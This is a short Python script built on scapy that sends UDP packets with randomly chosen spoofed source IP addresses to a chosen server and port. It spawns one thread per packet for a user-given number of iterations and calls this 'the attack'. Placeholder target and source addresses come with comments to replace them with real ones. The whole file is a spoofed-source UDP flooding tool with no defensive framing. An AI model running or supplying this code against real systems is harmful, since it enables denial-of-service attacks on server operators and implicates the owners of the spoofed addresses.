from scapy.all import *
from scapy.layers.inet import UDP, IP
import random
import threading
import time

# Function representing the task to be performed in each thread
def send_udp_packet(server_ip, server_port, source_ips, message):
    # Choose a random source IP address
    source_ip = random.choice(source_ips)

    # Create a UDP packet with a randomized source IP
    udp_packet = IP(src=source_ip, dst=server_ip) / UDP(dport=server_port) / message

    # Send the packet
    send(udp_packet)

# Main function
def main():
    message = input("Enter the message to send: ")
    iterations = int(input("Enter the number of times to execute the attack: "))
    
    # Server IP and port (replace with actual values)
    server_ip = '127.0.0.1'
    server_port = 12345

    # List of source IP addresses to use (replace with actual IPs)
    source_ips = ['192.168.1.100', '192.168.1.101', '192.168.1.102']

    threads = []

    start_time = time.time()  # Record the start time

    # Create threads and start the attack
    for _ in range(iterations):
        thread = threading.Thread(target=send_udp_packet, args=(server_ip, server_port, source_ips, message))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    end_time = time.time()  # Record the end time

    duration = end_time - start_time
    print(f"Executed the attack for {iterations} time(s) in {duration:.2f} seconds.")

if __name__ == "__main__":
    main()
